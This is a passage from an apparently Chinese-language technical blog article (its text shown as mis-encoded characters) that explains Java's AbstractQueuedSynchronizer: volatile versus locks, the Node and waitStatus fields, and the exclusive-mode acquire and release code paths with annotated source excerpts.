        }
    }
}
</code></pre>
<p><strong>AQSå¦‚ä½•å®ç°å†…å­˜è¯­ä¹‰ï¼Ÿ</strong></p>
<p>é€šè¿‡volatileå˜é‡<code>state</code>å’ŒCASæ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–é”æ—¶çš„å†…å­˜è¯­ä¹‰</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-comment">// CASæ“ä½œå…·æœ‰volatileè¯»+å†™çš„å†…å­˜è¯­ä¹‰</span>
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}

<span class="hljs-comment">// é‡Šæ”¾é”æ—¶çš„å†…å­˜è¯­ä¹‰</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;  <span class="hljs-comment">// volatileå†™ï¼Œåˆ·æ–°ç¼“å­˜åˆ°ä¸»å†…å­˜</span>
}
</code></pre>
<p><strong>volatile vs é”</strong>ï¼š</p>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">volatile</th><th align="left">é”</th></tr></thead><tbody><tr><td align="left">å¯è§æ€§</td><td align="left">âœ… ä¿è¯</td><td align="left">âœ… ä¿è¯</td></tr><tr><td align="left">åŸå­æ€§</td><td align="left">âŒ åªä¿è¯å•ä¸ªè¯»/å†™</td><td align="left">âœ… ä¿è¯ä¸´ç•ŒåŒºåŸå­æ€§</td></tr><tr><td align="left">æœ‰åºæ€§</td><td align="left">âœ… ç¦æ­¢é‡æ’åº</td><td align="left">âœ… ç¦æ­¢é‡æ’åº</td></tr><tr><td align="left">å¤åˆæ“ä½œ</td><td align="left">âŒ ä¸æ”¯æŒ</td><td align="left">âœ… æ”¯æŒ</td></tr><tr><td align="left">æ€§èƒ½</td><td align="left">æ›´å¥½ï¼ˆæ— é˜»å¡ï¼‰</td><td align="left">æœ‰é˜»å¡å¼€é”€</td></tr></tbody></table>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// volatileé€‚åˆçš„åœºæ™¯ï¼šçŠ¶æ€æ ‡å¿—</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shutdown</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    shutdown = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å•ä¸ªå†™æ“ä½œï¼Œvolatileè¶³å¤Ÿ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!shutdown) {  <span class="hljs-comment">// å•ä¸ªè¯»æ“ä½œ</span>
        <span class="hljs-comment">// ...</span>
    }
}

<span class="hljs-comment">// volatileä¸é€‚åˆçš„åœºæ™¯ï¼šå¤åˆæ“ä½œ</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// ã€é”™è¯¯ã€‘è¿™æ˜¯è¯»-æ”¹-å†™ï¼Œä¸æ˜¯åŸå­æ“ä½œï¼</span>
}

<span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼šä½¿ç”¨é”æˆ–AtomicInteger</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safeIncrement</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        count++;  <span class="hljs-comment">// ç°åœ¨æ˜¯çº¿ç¨‹å®‰å…¨çš„</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-46">4. NodeèŠ‚ç‚¹è¯¦è§£</h3>
<h4 data-id="heading-47">4.1 Nodeç»“æ„</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">/** å…±äº«æ¨¡å¼æ ‡è®° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
    <span class="hljs-comment">/** ç‹¬å æ¨¡å¼æ ‡è®° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºçº¿ç¨‹å·²å–æ¶ˆ */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºåç»§çº¿ç¨‹éœ€è¦å”¤é†’ */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºçº¿ç¨‹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾… */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;
    <span class="hljs-comment">/** waitStatuså€¼ï¼šè¡¨ç¤ºå…±äº«æ¨¡å¼ä¸‹æ— æ¡ä»¶ä¼ æ’­ */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>;
    
    <span class="hljs-comment">/** ç­‰å¾…çŠ¶æ€ */</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">/** å‰é©±èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    
    <span class="hljs-comment">/** åç»§èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">/** èŠ‚ç‚¹ä¸­çš„çº¿ç¨‹ */</span>
    <span class="hljs-keyword">volatile</span> Thread thread;
    
    <span class="hljs-comment">/** é“¾æ¥ä¸‹ä¸€ä¸ªç­‰å¾…æ¡ä»¶çš„èŠ‚ç‚¹ï¼Œæˆ–ç‰¹æ®Šå€¼SHARED */</span>
    Node nextWaiter;
}
</code></pre>
<h4 data-id="heading-48">4.2 waitStatusçŠ¶æ€è¯¦è§£</h4>
<p><code>waitStatus</code>æ˜¯Nodeä¸­æœ€å¤æ‚çš„å­—æ®µï¼Œç”¨äºè¡¨ç¤ºèŠ‚ç‚¹çš„ç­‰å¾…çŠ¶æ€ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89987cdb1531417ebc3c42507ea93508~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=wvszJVVzaN07BGprM7JFh3CVx%2FY%3D" alt="waitstatus-state-diagram.drawio.png" loading="lazy"/></p>



































<table><thead><tr><th align="left">çŠ¶æ€å€¼</th><th align="left">åç§°</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">åˆå§‹çŠ¶æ€</td><td align="left">æ–°å»ºèŠ‚ç‚¹çš„é»˜è®¤çŠ¶æ€</td></tr><tr><td align="left"><strong>-1</strong></td><td align="left">SIGNAL</td><td align="left">å½“å‰èŠ‚ç‚¹é‡Šæ”¾é”åéœ€è¦å”¤é†’åç»§èŠ‚ç‚¹</td></tr><tr><td align="left"><strong>1</strong></td><td align="left">CANCELLED</td><td align="left">çº¿ç¨‹å·²å–æ¶ˆï¼ˆè¶…æ—¶æˆ–ä¸­æ–­ï¼‰</td></tr><tr><td align="left"><strong>-2</strong></td><td align="left">CONDITION</td><td align="left">èŠ‚ç‚¹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾…</td></tr><tr><td align="left"><strong>-3</strong></td><td align="left">PROPAGATE</td><td align="left">å…±äº«æ¨¡å¼ä¸‹ï¼Œé‡Šæ”¾æ“ä½œéœ€è¦ä¼ æ’­</td></tr></tbody></table>
<p><strong>SIGNALçŠ¶æ€çš„é‡è¦æ€§</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// èŠ‚ç‚¹å…¥é˜Ÿåï¼Œéœ€è¦å°†å‰é©±çš„waitStatusè®¾ä¸ºSIGNAL</span>
<span class="hljs-comment">// è¿™æ ·å‰é©±é‡Šæ”¾é”æ—¶æ‰ä¼šå”¤é†’å½“å‰èŠ‚ç‚¹</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;
    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)
        <span class="hljs-comment">// å‰é©±å·²ç»æ˜¯SIGNALï¼Œå¯ä»¥å®‰å…¨é˜»å¡</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å‰é©±å·²å–æ¶ˆï¼Œè·³è¿‡</span>
        <span class="hljs-keyword">do</span> {
            node.prev = pred = pred.prev;
        } <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>);
        pred.next = node;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å°†å‰é©±çŠ¶æ€è®¾ä¸ºSIGNAL</span>
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-49">4.3 èŠ‚ç‚¹æ¨¡å¼</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ä¸ºå…±äº«æ¨¡å¼</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isShared</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> nextWaiter == SHARED;
}

<span class="hljs-comment">// åˆ›å»ºèŠ‚ç‚¹</span>
Node(Thread thread, Node mode) {     <span class="hljs-comment">// Used by addWaiter</span>
    <span class="hljs-built_in">this</span>.nextWaiter = mode;
    <span class="hljs-built_in">this</span>.thread = thread;
}

Node(Thread thread, <span class="hljs-type">int</span> waitStatus) { <span class="hljs-comment">// Used by Condition</span>
    <span class="hljs-built_in">this</span>.waitStatus = waitStatus;
    <span class="hljs-built_in">this</span>.thread = thread;
}
</code></pre>
<hr/>
<h3 data-id="heading-50">5. ç‹¬å æ¨¡å¼è·å–é”</h3>
<h4 data-id="heading-51">5.1 acquireæµç¨‹æ¦‚è§ˆ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        selfInterrupt();
}
</code></pre>
<p>æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2259ba92ca041aa9b5f7e238c508c0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=W0jFx%2FiXsl52TkgJCuXwZtlg83s%3D" alt="acquire-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-52">5.2 tryAcquire - å­ç±»å®ç°</h4>
<p>ä»¥ReentrantLockçš„éå…¬å¹³é”ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NonfairSync.tryAcquire</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">return</span> nonfairTryAcquire(acquires);
}

<span class="hljs-comment">// Sync.nonfairTryAcquire</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼ŒCASå°è¯•è·å–</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
            setExclusiveOwnerThread(current);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
        <span class="hljs-comment">// å½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œé‡å…¥</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
        <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">// overflow</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(nextc);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-53">5.3 addWaiter - åˆ›å»ºèŠ‚ç‚¹å…¥é˜Ÿ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addWaiter</span><span class="hljs-params">(Node mode)</span> {
    <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), mode);
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„ï¼šå°è¯•ç›´æ¥æŒ‚åˆ°é˜Ÿå°¾</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> tail;
    <span class="hljs-keyword">if</span> (pred != <span class="hljs-literal">null</span>) {
        node.prev = pred;
        <span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
            pred.next = node;
            <span class="hljs-keyword">return</span> node;
        }
    }
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„å¤±è´¥ï¼Œè¿›å…¥å®Œæ•´å…¥é˜Ÿæµç¨‹</span>
    enq(node);
    <span class="hljs-keyword">return</span> node;
}

<span class="hljs-keyword">private</span> Node <span class="hljs-title function_">enq</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
        <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆå§‹åŒ–ï¼ˆåˆ›å»ºå“¨å…µèŠ‚ç‚¹ï¼‰</span>
            <span class="hljs-keyword">if</span> (compareAndSetHead(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>()))
                tail = head;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å°†èŠ‚ç‚¹æŒ‚åˆ°é˜Ÿå°¾</span>
            node.prev = t;
            <span class="hljs-keyword">if</span> (compareAndSetTail(t, node)) {
                t.next = node;
                <span class="hljs-keyword">return</span> t;
            }
        }
    }
}
</code></pre>
<p><strong>å…¥é˜Ÿè¿‡ç¨‹å›¾è§£</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as å½“å‰çº¿ç¨‹
    participant AQS as AQSé˜Ÿåˆ—
    
    T-&gt;&gt;AQS: addWaiter(EXCLUSIVE)
    
    alt é˜Ÿåˆ—ä¸ä¸ºç©º
        T-&gt;&gt;AQS: node.prev = tail
        T-&gt;&gt;AQS: CASè®¾ç½®tail
        T-&gt;&gt;AQS: oldTail.next = node
    else é˜Ÿåˆ—ä¸ºç©º
        T-&gt;&gt;AQS: CASè®¾ç½®head(å“¨å…µ)
        T-&gt;&gt;AQS: tail = head
        T-&gt;&gt;AQS: å†æ¬¡å¾ªç¯å…¥é˜Ÿ
    end
    
    AQS--&gt;&gt;T: è¿”å›node
</code></pre>
<h4 data-id="heading-54">5.4 acquireQueued - æ’é˜Ÿè·å–é”</h4>
<p>è¿™æ˜¯æœ€æ ¸å¿ƒçš„æ–¹æ³•ï¼Œçº¿ç¨‹åœ¨é˜Ÿåˆ—ä¸­è‡ªæ—‹æˆ–é˜»å¡ï¼Œç›´åˆ°è·å–åˆ°é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-comment">// è·å–å‰é©±èŠ‚ç‚¹</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// å¦‚æœå‰é©±æ˜¯headï¼Œè¯´æ˜å½“å‰èŠ‚ç‚¹æ˜¯ç¬¬ä¸€ä¸ªç­‰å¾…è€…ï¼Œå°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                <span class="hljs-comment">// è·å–æˆåŠŸï¼Œå°†å½“å‰èŠ‚ç‚¹è®¾ä¸ºhead</span>
                setHead(node);
                p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span>
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦éœ€è¦é˜»å¡</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<p><strong>acquireQueuedæµç¨‹å›¾</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79781ba17c8a4eb5a3aaa97354434238~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=YMWib8lnPNED%2FMpVUgBwIcMazf0%3D" alt="acquireQueued-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-55">5.5 shouldParkAfterFailedAcquire - æ˜¯å¦é˜»å¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;
    
    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)
        <span class="hljs-comment">// å‰é©±çŠ¶æ€æ­£å¸¸ï¼Œå½“å‰çº¿ç¨‹å¯ä»¥å®‰å…¨é˜»å¡</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        
    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å‰é©±å·²å–æ¶ˆï¼Œè·³è¿‡æ‰€æœ‰å·²å–æ¶ˆçš„èŠ‚ç‚¹</span>
        <span class="hljs-keyword">do</span> {
            node.prev = pred = pred.prev;
        } <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>);
        pred.next = node;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å°†å‰é©±çŠ¶æ€è®¾ä¸ºSIGNAL</span>
        <span class="hljs-comment">// ä¸‹æ¬¡å¾ªç¯ä¼šè¿”å›true</span>
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¸ç›´æ¥é˜»å¡ï¼Œè€Œæ˜¯å…ˆè®¾ç½®å‰é©±ä¸ºSIGNALï¼Ÿ</strong></p>
<p>è¿™æ˜¯ä¸ºäº†ç¡®ä¿å½“å‰èŠ‚ç‚¹é˜»å¡åèƒ½è¢«æ­£ç¡®å”¤é†’ã€‚å¦‚æœç›´æ¥é˜»å¡ï¼Œè€Œå‰é©±çš„waitStatusä¸æ˜¯SIGNALï¼Œé‚£ä¹ˆå‰é©±é‡Šæ”¾é”æ—¶ä¸ä¼šå”¤é†’å½“å‰èŠ‚ç‚¹ï¼Œå¯¼è‡´æ°¸ä¹…é˜»å¡ã€‚</p>
<h4 data-id="heading-56">5.6 parkAndCheckInterrupt - é˜»å¡çº¿ç¨‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">parkAndCheckInterrupt</span><span class="hljs-params">()</span> {
    LockSupport.park(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// é˜»å¡å½“å‰çº¿ç¨‹</span>
    <span class="hljs-keyword">return</span> Thread.interrupted();  <span class="hljs-comment">// è¿”å›å¹¶æ¸…é™¤ä¸­æ–­çŠ¶æ€</span>
}
</code></pre>
<p><code>LockSupport.park()</code>ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°ä»¥ä¸‹æƒ…å†µä¹‹ä¸€å‘ç”Ÿï¼š</p>
<ol>
<li>å…¶ä»–çº¿ç¨‹è°ƒç”¨<code>unpark()</code>å”¤é†’</li>
<li>çº¿ç¨‹è¢«ä¸­æ–­</li>
<li>è™šå‡å”¤é†’ï¼ˆspurious wakeupï¼‰</li>
</ol>
<hr/>
<h3 data-id="heading-57">6. ç‹¬å æ¨¡å¼é‡Šæ”¾é”</h3>
<h4 data-id="heading-58">6.1 releaseæµç¨‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/056cadc2d6124d639b78598b80821355~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=bynkFvfLwXN%2FO736%2BAZhLsJkpiQ%3D" alt="release-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-59">6.2 tryRelease - å­ç±»å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ReentrantLock.Sync.tryRelease</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;
    
    <span class="hljs-comment">// åªæœ‰é”æŒæœ‰è€…æ‰èƒ½é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// stateå‡åˆ°0ï¼Œå®Œå…¨é‡Šæ”¾</span>
        free = <span class="hljs-literal">true</span>;
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    }
    setState(c);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<h4 data-id="heading-60">6.3 unparkSuccessor - å”¤é†’åç»§</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unparkSuccessor</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> node.waitStatus;
    <span class="hljs-keyword">if</span> (ws &lt; <span class="hljs-number">0</span>)
        compareAndSetWaitStatus(node, ws, <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// æ‰¾åˆ°éœ€è¦å”¤é†’çš„åç»§èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> node.next;
    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> || s.waitStatus &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// nextä¸ºç©ºæˆ–å·²å–æ¶ˆï¼Œä»tailå‘å‰æ‰¾</span>
        s = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail; t != <span class="hljs-literal">null</span> &amp;&amp; t != node; t = t.prev)
            <span class="hljs-keyword">if</span> (t.waitStatus &lt;= <span class="hljs-number">0</span>)
                s = t;
    }
    
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)
        LockSupport.unpark(s.thread);  <span class="hljs-comment">// å”¤é†’çº¿ç¨‹</span>
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦ä»tailå‘å‰æ‰¾ï¼Ÿ</strong></p>
<p>å› ä¸ºåœ¨<code>addWaiter</code>ä¸­ï¼Œè®¾ç½®<code>prev</code>æŒ‡é’ˆå’Œ<code>next</code>æŒ‡é’ˆä¸æ˜¯åŸå­æ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// addWaiterä¸­çš„ä»£ç </span>
node.prev = pred;               <span class="hljs-comment">// â‘  å…ˆè®¾ç½®prev</span>
